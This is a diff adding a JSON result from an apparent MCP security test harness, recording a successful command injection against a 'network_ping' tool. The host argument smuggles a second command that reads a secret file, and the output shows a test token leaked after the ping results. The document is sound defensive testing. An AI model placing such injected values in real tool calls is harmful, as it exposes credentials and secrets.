@@ -1,0 +1,59 @@
+{
+  "status": "vulnerable",
+  "mcp_mode": "command_injection_realistic",
+  "passed_file_value": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=3.70 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.088 ms\n64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.083 ms\n64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.061 ms\n\n--- 127.0.0.1 ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 3047ms\nrtt min/avg/max/mdev = 0.061/0.981/3.695/1.566 ms\nTEST_TOKEN_f63e504d9ed1990b58324f7ea91bea6bd0fac158",
+  "evidence": {
+    "triggered": true,
+    "vulnerability": "command_injection_realistic_network_ping",
+    "proof": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=3.70 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.088 ms\n64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.083 ms\n64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.061 ms\n\n--- 127.0.0.1 ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 3047ms\nrtt min/avg/max/mdev = 0.061/0.981/3.695/1.566 ms\nTEST_TOKEN_f63e504d9ed1990b58324f7ea91bea6bd0fac158",
+    "tool_result": {
+      "mode": "mcp_client",
+      "tool": "network_ping",
+      "result": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=3.70 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.088 ms\n64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.083 ms\n64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.061 ms\n\n--- 127.0.0.1 ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 3047ms\nrtt min/avg/max/mdev = 0.061/0.981/3.695/1.566 ms\nTEST_TOKEN_f63e504d9ed1990b58324f7ea91bea6bd0fac158",
+      "audit_id": "15b6eace9f4d786d",
+      "policy_applied": "allow",
+      "profile_used": "permissive",
+      "arguments": {
+        "host": "127.0.0.1; cat /app/logs/runtime_secret.txt"
+      },
+      "request_body": {
+        "name": "network_ping",
+        "arguments": {
+          "host": "127.0.0.1; cat /app/logs/runtime_secret.txt"
+        }
+      },
+      "status_code": 200
+    },
+    "exfiltration": {
+      "network_capture": {
+        "checked": true,
+        "found": false,
+        "pcap_exists": true,
+        "requests_found": 0,
+        "matched_requests": [],
+        "pcap_files_checked": [
+          "/app/captures/evil-server.pcap",
+          "/app/captures/llm-harness.pcap",
+          "/app/captures/mcp-client.pcap",
+          "/app/captures/mcp-server.pcap",
+          "/app/captures/oauth-mock.pcap",
+          "/app/captures/real-target-demo.pcap",
+          "/app/captures/vuln-server-insecure.pcap",
+          "/app/captures/vuln-server-no-tls.pcap",
+          "/app/captures/vuln-server-ssrf-proxy.pcap",
+          "/app/captures/evil-server.pcap",
+          "/app/captures/llm-harness.pcap",
+          "/app/captures/mcp-client.pcap",
+          "/app/captures/mcp-server.pcap",
+          "/app/captures/oauth-mock.pcap",
+          "/app/captures/real-target-demo.pcap",
+          "/app/captures/vuln-server-insecure.pcap",
+          "/app/captures/vuln-server-no-tls.pcap",
+          "/app/captures/vuln-server-ssrf-proxy.pcap"
+        ],
+        "errors": [],
+        "retries_used": 1
+      }
+    }
+  }
+}
